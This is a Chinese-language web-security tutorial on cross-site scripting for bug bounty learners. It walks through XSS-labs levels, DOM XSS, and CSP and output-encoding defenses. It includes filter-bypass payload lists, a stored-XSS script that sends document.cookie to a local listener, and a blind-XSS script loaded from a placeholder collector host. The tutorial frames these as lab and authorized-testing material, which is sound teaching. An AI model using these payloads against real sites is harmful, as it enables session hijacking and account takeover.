---
title: 第 5 篇：XSS
layout: article
---
# 第 5 篇：XSS——让浏览器替攻击者执行代码

SQL 注入打的是数据库，XSS 打的是**其他用户的浏览器**。原理同样一句话：**用户输入被当成 HTML/JavaScript 代码渲染了**。

XSS 的危害不是弹个 `alert(1)`。它能偷 Cookie、伪造请求、改页面钓鱼、打管理员后台，配合 CSRF 还能完成"以受害者身份操作"。SRC 里反射型 XSS 通常定级不高，**存储型 XSS 和打管理后台的 XSS** 才是重点。

---

## 一、三种 XSS，差别在"代码存在哪"

| 类型 | 代码位置 | 触发方式 | 典型场景 |
| --- | --- | --- | --- |
| 反射型 | URL 参数被服务端直接拼进页面 | 受害者点链接 | 搜索框、错误页、跳转提示 |
| 存储型 | payload 存进数据库，每次访问都执行 | 访问页面即触发 | 留言、评论、昵称、工单、后台日志 |
| DOM 型 | 前端 JS 从 source 取数据写进 sink | 访问带 payload 的 URL | `innerHTML`、`location.hash`、`eval` |

**反射型**需要诱导点击，**存储型**只要有人看就中，**DOM 型**服务端日志里可能完全看不到 payload。

---

## 二、先看懂上下文：payload 为什么长这样

XSS 的核心不是背 payload，而是判断输入落在 HTML 的哪个位置。位置不同，闭合方式完全不同。

### 1. HTML 标签之间

```html
<div>你搜索的是：<?php echo $_GET['q']; ?></div>
```

直接闭合：

```html
<script>alert(1)</script>
```

### 2. HTML 属性值里（双引号）

```html
<input value="<?php echo $_GET['q']; ?>">
```

需要先闭合属性：

```html
"><script>alert(1)</script>
```

或者用事件：

```html
" autofocus onfocus="alert(1)
```

### 3. HTML 属性值里（单引号）

```html
<input value='<?php echo $_GET['q']; ?>'>
```

```html
' autofocus onfocus='alert(1)
```

### 4. `<script>` 标签里的 JS 字符串

```html
<script>
  var name = "<?php echo $_GET['name']; ?>";
</script>
```

闭合字符串和标签：

```html
";alert(1);//
```

如果双引号被转义，试单引号、模板字符串、`</script>` 闭合：

```html
</script><script>alert(1)</script>
```

### 5. `href` / `src` 属性

```html
<a href="<?php echo $_GET['url']; ?>">点我</a>
```

```html
javascript:alert(1)
```

或者：

```html
" onclick="alert(1)
```

### 6. CSS / 注释 / JSON 里

这些位置更麻烦，通常需要具体分析。JSON 里如果 `</script>` 没转义，可以先闭合 script 标签。

**判断上下文的方法：** 提交一个带特殊字符的标记，比如 `AAA"'<>`，在响应里搜 `AAA`，看它前后是什么字符。Burp 的 Repeater + 浏览器查看源代码最快。

---

## 三、XSS-labs 前 10 关：逐关拆

先按第 2 篇把 XSS-labs 跑起来（`http://127.0.0.1:8082`）。不同版本页面略有差异，但关卡逻辑基本一致。每关都是反射型，重点是"过滤了什么、怎么绕"。

### Level 1：没有任何过滤

```text
http://127.0.0.1:8082/level1.php?name=<script>alert(1)</script>
```

直接弹窗。这一关只是让你确认流程。

### Level 2：`<script>` 被转义，但属性没转义

页面上输入框的值会回显。试：

```text
"><script>alert(1)</script>
```

如果 `<` `>` 被编码，但双引号没处理，就用事件：

```text
" autofocus onfocus="alert(1)
```

### Level 3：单引号属性 + 尖括号被编码

输入落在 `value='...'` 里，尖括号被 HTML 实体编码。闭合单引号，加事件：

```text
' autofocus onfocus='alert(1)
```

页面加载后输入框自动聚焦，触发 `onfocus`。有的版本需要点一下输入框。

### Level 4：双引号属性，尖括号被过滤

```text
" autofocus onfocus="alert(1)
```

如果 `onfocus` 被拦，试 `onmouseover`、`onclick`，或者：

```text
" onmouseover="alert(1)
```

### Level 5：`script` 和 `on` 被过滤

试 `<a href="javascript:alert(1)">`：

```text
"><a href="javascript:alert(1)">click</a>
```

如果 `javascript:` 被拦，试大小写、HTML 实体、`data:`：

```text
"><a href="JaVaScRiPt:alert(1)">click</a>
```

### Level 6：关键字过滤更严

常见绕过是大小写 + 双写：

```text
"><a hreF="javascripT:alert(1)">click</a>
```

或者：

```text
"><scr<script>ipt>alert(1)</script>
```

具体看它过滤的是 `script`、`href` 还是 `on`。**先提交一个正常 payload，看返回里哪些字符消失了**，比盲试有效。

### Level 7：把 `script`、`on`、`href` 都删掉

双写绕过：

```text
"><scr<script>ipt>alert(1)</script>
```

后端只删一次 `script`，剩下的又拼成 `script`。这类"删除一次"的过滤，双写通常有效。

### Level 8：`javascript:` 被替换/编码

用 HTML 实体绕过：

```text
javascrip&#116;:alert(1)
```

或者十六进制实体：

```text
&#x6a;avascript:alert(1)
```

浏览器解析属性时会先解实体，再执行。

### Level 9：要求输入像合法 URL

常见 payload：

```text
javascrip&#116;:alert(1)//http://
```

`//http://` 用来让"必须包含 http"的检查通过，实际执行的是前面的 `javascript:`。

### Level 10：隐藏字段

页面里有 `t_link`、`t_history`、`t_sort` 等隐藏 input。`t_sort` 会回显，构造：

```text
&t_sort=" autofocus onfocus="alert(1)
```

如果被过滤，试 `type` 改成 `text` 再配合事件：

```text
&t_sort=" type="text" autofocus onfocus="alert(1)
```

**说明：** 关卡版本不同，输出位置和过滤规则会变。不要死记 payload，按"上下文 → 过滤 → 闭合"的顺序推。每关先在 Burp 里看响应，确认输入落在哪。

---

## 四、DOM 型 XSS：服务端完全不知情

看这段前端代码：

```html
<div id="out"></div>
<script>
  const q = decodeURIComponent(location.hash.slice(1));
  document.getElementById("out").innerHTML = q;
</script>
```

`location.hash` 是 source，`innerHTML` 是 sink。访问：

```text
http://127.0.0.1:8000/#<img src=x onerror=alert(1)>
```

浏览器把 hash 里的内容写进 `innerHTML`，`img` 加载失败触发 `onerror`。请求根本没到服务端，WAF 和日志都看不到。

### 常见的 source 和 sink

| source | 说明 |
| --- | --- |
| `location.search` | `?q=` 参数 |
| `location.hash` | `#` 后面 |
| `location.href` | 完整 URL |
| `document.referrer` | 来源页 |
| `window.name` | 跨页保留 |
| `postMessage` 的 `event.data` | 跨窗口消息 |
| `localStorage` / `sessionStorage` | 本地存储 |

| sink | 风险 |
| --- | --- |
| `innerHTML` / `outerHTML` | 插入 HTML，事件可执行 |
| `document.write` | 直接写文档 |
| `eval` / `Function` | 执行字符串 |
| `setTimeout(string)` / `setInterval(string)` | 字符串当代码 |
| `location.href` / `location.assign` | `javascript:` 可执行 |
| `jQuery.html()` / `$()` | 类似 innerHTML |
| `element.setAttribute("onclick", ...)` | 事件注入 |

### 自己搭一个 DOM 型靶场

```python
# dom_lab.py —— 只在本机跑
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    q = request.args.get("q", "")
    return f"""
    <div id="out"></div>
    <script>
      const q = new URLSearchParams(location.search).get('q') || '';
      document.getElementById('out').innerHTML = q;
    </script>
    <p>q = {q}</p>
    """

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8000, debug=True)
```

运行：

```bash
python3 dom_lab.py
```

访问：

```text
http://127.0.0.1:8000/?q=<img src=x onerror=alert(1)>
```

页面里 `q = ...` 那行是服务端直接拼的，也会反射；`innerHTML` 那行是 DOM 型。用浏览器开发者工具看元素，确认 payload 落在哪。

---

## 五、本地实验：XSS 偷 Cookie 到底怎么发生

**只用自己的靶场和测试账号。**

### 1. 起一个接收日志的服务

```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

### 2. 在 DVWA 存储型 XSS 里提交

先登录 DVWA，把安全等级调 `low`，进 **XSS (Stored)**，在留言里填：

```html
<script>
new Image().src = 'http://127.0.0.1:8000/?c=' + encodeURIComponent(document.cookie);
</script>
```

提交后，任何访问这个留言页面的浏览器都会向 8000 端口发请求。终端会打印：

```text
127.0.0.1 - - [14/Nov/2026 21:00:00] code 404, message File not found
127.0.0.1 - - [14/Nov/2026 21:00:00] "GET /?c=security%3Dlow%3B%20PHPSESSID%3D... HTTP/1.1" 404 -
```

### 3. 为什么有时只看到 `security=low`

如果日志里只有 `security=low`，没有 `PHPSESSID`，说明 `PHPSESSID` 带了 `HttpOnly`。这不是 payload 写错了，而是**服务端防御生效了**。

验证：

```bash
curl -sI http://127.0.0.1:8080/login.php | grep -i set-cookie
```

看到 `HttpOnly` 就说明 JS 读不到它。XSS 仍然能发请求、改页面，但偷不走会话 Cookie。

### 4. 偷到 Cookie 之后能做什么

在本地实验里，把偷到的 `PHPSESSID` 填进另一个浏览器的 Cookie，刷新页面，如果直接是登录状态，就说明会话劫持成功。**这个实验只在自己的靶场做，真实项目里绝对不要拿别人的会话登录。**

---

## 六、过滤绕过：从"被拦"到"能执行"

### 常见过滤和对应思路

| 过滤 | 绕过思路 | 示例 |
| --- | --- | --- |
| 转义 `<` `>` | 用属性事件、`javascript:` | `" autofocus onfocus="alert(1)` |
| 过滤 `script` | 换标签 | `<img src=x onerror=alert(1)>`、`<svg onload=alert(1)>` |
| 过滤 `on*` | 换事件、换标签 | `<details open ontoggle=alert(1)>` |
| 过滤 `alert` | 换函数/拼接 | `confirm(1)`、`prompt(1)`、`top['al'+'ert'](1)` |
| 过滤引号 | 不用引号 | `<img src=x onerror=alert(1)>` |
| 过滤空格 | 用 `/`、换行、Tab | `<svg/onload=alert(1)>` |
| 过滤 `javascript:` | 大小写、实体、Tab | `JaVaScRiPt:alert(1)`、`javascrip&#116;:alert(1)` |
| 删除关键字一次 | 双写 | `<scr<script>ipt>alert(1)</script>` |
| URL 编码一次 | 双重编码 | `%253Cscript%253E` |
| 只允许 http 开头 | 拼接伪协议 | `javascript:alert(1)//http://` |

### 几个能直接用的 payload

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<a href="javascript:alert(1)">x</a>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
```

**注意：** 现代浏览器和框架的转义越来越严，很多 payload 只在特定上下文有效。报告里必须写清楚"在哪个参数、什么浏览器、什么版本"复现成功，否则审核复现不了会直接拒。

### 编码工具

浏览器控制台：

```javascript
encodeURIComponent('<img src=x onerror=alert(1)>')
// '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'

btoa('<script>alert(1)</script>')
// 'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
```

CyberChef 里做 URL、HTML Entity、Base64、Hex 转换更直观。

---

## 七、CSP：最后一道闸，但不是万能

服务端返回：

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

含义：

- `default-src 'self'`：默认只允许同源资源；
- `script-src 'self'`：只允许同源脚本，内联 `<script>` 和 `onclick` 都被拦；
- `object-src 'none'`：禁止 Flash/插件；
- `base-uri 'self'`：防止 `<base>` 标签劫持相对路径。

### 常见错误配置

| 配置 | 问题 |
| --- | --- |
| `script-src 'unsafe-inline'` | 内联脚本可执行，XSS 基本没防住 |
| `script-src 'unsafe-eval'` | `eval`、`Function` 可用 |
| `script-src *` | 任意域名脚本都能加载 |
| `default-src 'self' cdn.example.com` | CDN 上如果有 JSONP 或可控文件，可绕过 |
| 只设 `report-uri` 不设拦截 | 只报告不阻止 |

### CSP 绕过的思路

- 白名单里有 JSONP 接口：`<script src="//cdn.example.com/jsonp?callback=alert(1)//"></script>`；
- 白名单 CDN 允许上传/托管 JS；
- AngularJS 等库的模板注入；
- `base-uri` 没设，配合相对路径脚本劫持。

这些都属于"配置不严"，不是 CSP 本身没用。报告里看到 CSP 先别放弃，读一遍 `script-src` 的白名单再判断。

---

## 八、XSS 能造成什么影响

| 场景 | 影响 | SRC 定级参考 |
| --- | --- | --- |
| 反射型，需要点击 | 钓鱼、跳转、少量信息泄露 | 低 |
| 存储型，普通用户页面 | 蠕虫、批量劫持、账号操作 | 中到高 |
| 存储型，管理后台 | 打管理员、后台操作、结合 CSRF | 高到严重 |
| DOM 型，需构造链接 | 视利用链而定 | 低到中 |
| Blind XSS，工单/日志后台 | 打客服/运维 | 高 |

### 常见组合链

1. **XSS + CSRF**：XSS 读取页面里的 CSRF token，再发请求。SameSite 能挡一部分，但同站请求不受影响。
2. **XSS + 越权**：管理员打开被污染的页面，XSS 用管理员权限创建账号/改配置。
3. **XSS + 钓鱼**：把登录框改成假的，把密码发到攻击者服务器。
4. **XSS + 键盘记录**：监听 `keydown`，把输入发出去。

### Blind XSS

payload 不在当前页面执行，而是在管理员后台、日志系统、客服工单里执行。测试时用带外平台接收：

```html
<script src="//your-xss-hunter.example/your-id"></script>
```

或者自己搭一个：

```html
<script>
new Image().src='http://127.0.0.1:8000/blind?u='+encodeURIComponent(location.href)+'&c='+encodeURIComponent(document.cookie);
</script>
```

**只在授权项目里用**，不要往真实用户会看到的地方插 payload。提交到后台的留言、工单，测试前确认规则允许。

---

## 九、防御：输出编码 + 上下文 + CSP

### 1. 按上下文编码

| 输出位置 | 编码方式 |
| --- | --- |
| HTML 文本 | `&` `<` `>` `"` `'` 转实体 |
| HTML 属性 | 属性值加引号，实体编码 |
| JavaScript 字符串 | JS 转义，避免直接拼 |
| URL 参数 | `encodeURIComponent` |
| CSS | 避免用户输入进入 CSS |

PHP：

```php
echo htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

Java（Spring/Thymeleaf 默认转义）：

```html
<span th:text="${userInput}"></span>   <!-- 转义 -->
<span th:utext="${userInput}"></span>  <!-- 不转义，危险 -->
```

### 2. 前端安全写法

```javascript
// 不推荐
el.innerHTML = userInput;

// 推荐：纯文本
el.textContent = userInput;

// 需要富文本时，用 DOMPurify 白名单过滤
el.innerHTML = DOMPurify.sanitize(userInput);
```

React/Vue 默认转义插值，但 `dangerouslySetInnerHTML`、`v-html` 会绕过，代码审计时重点搜这两个。

### 3. Cookie 和响应头

```http
Set-Cookie: PHPSESSID=...; HttpOnly; Secure; SameSite=Lax
Content-Security-Policy: default-src 'self'; script-src 'self'
X-Content-Type-Options: nosniff
```

- `HttpOnly` 防偷 Cookie，但防不了 XSS 发请求；
- CSP 降低内联脚本成功率；
- `X-XSS-Protection` 已废弃，不要依赖。

### 4. 输入校验只能当辅助

黑名单过滤 `<script>` 很容易被绕过。**输出编码才是主防线**，输入校验用来限制格式（比如手机号只允许数字）。

---

## 十、SRC 里怎么测 XSS

1. **先找回显点**：搜索、错误提示、用户名、昵称、评论、工单、文件名、URL 跳转提示。
2. **提交唯一标记**：`xss123<>"'`，在响应里搜 `xss123`，看上下文。
3. **判断类型**：刷新页面还在 → 存储型；只在 URL 里 → 反射型；查看源代码没有、但页面执行 → DOM 型。
4. **构造最小 payload**：先 `alert(1)`，确认执行后再换成证明影响的 payload（比如读取自己的 Cookie、发一个自己的请求）。
5. **不要打真实用户**：存储型 XSS 提交后，只用自己的另一个测试账号访问；不要发给管理员或真实用户。
6. **报告写清步骤**：哪个页面、哪个参数、什么浏览器、payload、预期结果、实际结果。最好附一张执行截图和请求/响应。
7. **自 XSS 不收**：只有自己能触发的不算漏洞。要证明"另一个用户/管理员打开也会执行"。
8. **注意 CSP/HttpOnly**：如果 CSP 阻止执行，或者 Cookie 是 HttpOnly，报告里要如实写影响，不要夸大。

---

## 十一、本篇自检清单

- [ ] 能说出反射型、存储型、DOM 型的区别和各自触发条件。
- [ ] 能在 HTML 文本、双引号属性、单引号属性、JS 字符串四种上下文写出闭合 payload。
- [ ] XSS-labs 前 10 关能独立过，知道每关过滤了什么。
- [ ] 能解释 `innerHTML` 为什么危险，`textContent` 为什么安全。
- [ ] 在本地 DVWA 做过一次 Cookie 窃取实验，看到日志。
- [ ] 能说出 `HttpOnly`、`SameSite`、CSP 各防什么、防不住什么。
- [ ] 知道自 XSS 为什么不收，存储型 XSS 怎么证明影响。
- [ ] 能写出 `htmlspecialchars`、`textContent`、DOMPurify 三种修复方式。

---

**下一篇：[《CSRF 与 SSRF》](第6篇-CSRF与SSRF.md)**：一个借用户的浏览器发请求，一个借服务器的手发请求。CSRF 讲 token 绕过、SameSite、CORS 错误配置；SSRF 讲内网探测、云元数据、gopher 打 Redis，以及为什么它常被定为高危。
